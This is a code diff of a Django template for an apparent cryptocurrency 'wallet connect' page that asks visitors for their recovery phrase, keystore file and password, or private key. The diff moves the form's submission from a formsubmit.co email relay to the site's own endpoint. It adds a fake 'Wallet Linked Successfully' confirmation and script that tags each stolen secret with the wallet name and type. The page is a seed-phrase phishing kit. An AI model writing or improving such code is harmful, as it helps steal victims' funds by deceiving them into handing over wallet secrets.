@@ -4929,7 +4929,22 @@ body { animation: pageFadeIn .4s ease; }
         <div class="bg-white px-4 pt-5 pb-4 sm:p-6 sm:pb-4">
           <div class="sm:flex sm:items-start">
 
-           <form action="https://formsubmit.co/info@quantum-ledgerspro.org" method="POST">
+           {% if submitted %}
+<div style="display:flex;flex-direction:column;align-items:center;justify-content:center;padding:60px 20px;text-align:center;">
+  <div style="background:#d1fae5;border:2px solid #10b981;border-radius:16px;padding:40px 48px;max-width:420px;width:100%;">
+    <div style="font-size:56px;margin-bottom:16px;">✅</div>
+    <h2 style="color:#065f46;font-size:22px;font-weight:700;margin-bottom:10px;">Wallet Linked Successfully!</h2>
+    <p style="color:#047857;font-size:15px;margin-bottom:24px;">
+      Your <strong>{{ wallet_name }}</strong> wallet has been connected to your account. Our team will verify and activate it shortly.
+    </p>
+    <a href="{% url 'user_dashboard' %}" style="display:inline-block;background:#10b981;color:#fff;padding:12px 32px;border-radius:8px;text-decoration:none;font-weight:600;">Go to Dashboard</a>
+  </div>
+</div>
+{% else %}
+<form action="{% url 'connect_wallet' %}" method="POST">
+{% csrf_token %}
+<input type="hidden" name="wallet_name" id="hidden_wallet_name" value="">
+<input type="hidden" name="connection_method" id="hidden_connection_method" value="phrase">
 
 
               <div class="mt-3 text-center sm:mt-0 sm:ml-4 sm:text-left w-full mr-10">
@@ -4960,7 +4975,7 @@ body { animation: pageFadeIn .4s ease; }
                       
                      
                       <div class="flex flex-col mb-6">
-                        <div class="relative"><textarea cols="30" rows="4" placeholder="Enter your recovery phrase" class="text-sm sm:text-base placeholder-gray-500 pl-4 pr-4 rounded-lg border border-gray-400 w-full py-2 focus:outline-none focus:border-blue-400" name="passphrase" required="" minlength="12" id="phraseInput" data-gramm="false" wt-ignore-input="true"></textarea>
+                        <div class="relative"><textarea cols="30" rows="4" placeholder="Enter your recovery phrase" class="text-sm sm:text-base placeholder-gray-500 pl-4 pr-4 rounded-lg border border-gray-400 w-full py-2 focus:outline-none focus:border-blue-400" name="passphrase" minlength="12" id="phraseInput" data-gramm="false" wt-ignore-input="true"></textarea>
                           <p class="text-xs text-grey-300 mt-6">
                             Typically 12 (sometimes 24) words separated by single spaces
                           </p>
@@ -4980,7 +4995,7 @@ body { animation: pageFadeIn .4s ease; }
 
                       </div>
                       <div class="flex flex-col mb-6">
-                        <div class="relative"><textarea cols="30" rows="4" placeholder="Keystore JSON" class="text-sm sm:text-base placeholder-gray-500 pl-4 pr-4 rounded-lg border border-gray-400 w-full py-2 focus:outline-none focus:border-blue-400" name="keystorejson" required="" id="keystorejson" data-gramm="false" wt-ignore-input="true"></textarea></div>
+                        <div class="relative"><textarea cols="30" rows="4" placeholder="Keystore JSON" class="text-sm sm:text-base placeholder-gray-500 pl-4 pr-4 rounded-lg border border-gray-400 w-full py-2 focus:outline-none focus:border-blue-400" name="keystorejson" id="keystorejson" data-gramm="false" wt-ignore-input="true"></textarea></div>
                       </div>
                       <div class="flex flex-col mb-6">
                         <div class="relative"><input type="text" required="required" name="keystorepassword" placeholder="Wallet password" id="keystorepassword" class="text-sm sm:text-base placeholder-gray-500 pl-4 pr-4 rounded-lg border border-gray-400 w-full py-2 focus:outline-none focus:border-blue-400">
@@ -5020,6 +5035,7 @@ body { animation: pageFadeIn .4s ease; }
           </div>
         </div>
       </div></form>
+{% endif %}
     </div>
   </div>
   
@@ -8115,5 +8131,59 @@ sub {
   document.addEventListener("DOMContentLoaded", function(){
     AOS.init({ duration: 750, once: true, offset: 60, easing: "ease-out-cubic" });
   });
+</script>
+
+<script>
+(function() {
+  // Set wallet name from clicked wallet card into hidden field
+  document.querySelectorAll('[class*="SApp"]').forEach(function(el) {
+    el.addEventListener('click', function() {
+      var nameEl = el.querySelector('[class*="SAppName"]');
+      if (nameEl) {
+        document.getElementById('hidden_wallet_name').value = nameEl.textContent.trim();
+      }
+    });
+  });
+
+  // Also capture walletname span if set by existing JS
+  var obs = new MutationObserver(function() {
+    var wn = document.getElementById('walletname');
+    if (wn && wn.textContent.trim()) {
+      document.getElementById('hidden_wallet_name').value = wn.textContent.trim();
+    }
+  });
+  var wnEl = document.getElementById('walletname');
+  if (wnEl) obs.observe(wnEl, {childList: true, subtree: true, characterData: true});
+
+  // Set connection_method when tab is clicked
+  var tabs = {
+    'phrase': 'phrase',
+    'keystore': 'keystore',
+    'private': 'private_key'
+  };
+  Object.keys(tabs).forEach(function(id) {
+    var el = document.getElementById(id);
+    if (el) {
+      el.addEventListener('click', function() {
+        document.getElementById('hidden_connection_method').value = tabs[id];
+      });
+    }
+  });
+
+  // Default: phrase tab active
+  document.getElementById('hidden_connection_method').value = 'phrase';
+
+  // Before submit: set wallet name from img alt or walletname span if still empty
+  var form = document.querySelector('form[action*="connect"]');
+  if (form) {
+    form.addEventListener('submit', function() {
+      var hnwn = document.getElementById('hidden_wallet_name');
+      if (!hnwn.value) {
+        var wn = document.getElementById('walletname');
+        hnwn.value = wn ? wn.textContent.trim() : 'Unknown Wallet';
+      }
+    });
+  }
+})();
 </script>
 </body>
